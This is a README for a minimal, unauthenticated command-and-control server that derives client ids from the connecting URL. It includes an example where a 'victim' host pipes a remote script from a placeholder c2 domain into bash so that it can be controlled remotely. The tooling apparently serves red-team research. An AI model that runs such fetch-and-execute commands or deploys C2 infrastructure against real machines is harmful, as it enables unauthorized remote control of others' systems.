# ResearchServers C2

A simple, single user, Command & Control server built on top of [ajxchapman/researchservers.](https://github.com/ajxchapman/researchservers)

**NOTE:** This does not implement *any* authentication. Anyone with knowledge of the URL a client connects over will be able to issue commands to the client.

Clients are given ids based on the connecting URL, for example a client connecting to https://c2.exmaple.com/client1/ will have an id of `client1`. In order to control this client you must connect to https://c2.example.com/client1/controller.html.

Ids are calculated from the URL Hostname and Path of the connecting client, e.g. :
* https://c2client2.example.com will have an id of `client2`
* https://www.example.com/c2client3/ will have an id of `client3`
* https://www.example.com/c2client4/test/ will have an id of `client4.test`
* https://c2org.example.com/it/ will have an id of `org.it`

The `/get_id` endpoint can tell you the id for a given URL:
```bash
user@victim:~$ curl https://c2org.example.com/c2id11211/testing/get_id
{"id": "org.id11211.testing"}
```

In order for requests to be routed to the c2 backend either the hostname or the first path directory must begin with the string `c2`.

## Example

`victim`
```bash
user@victim:~$ curl https://c2client1.example.com/runme.sh | bash
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                               Dload  Upload   Total   Spent    Left  Speed
100   458  100   458    0     0   1721      0 --:--:-- --:--:-- --:--:--  1721
```

`server`
https://c2.example.com/client1/controller.html
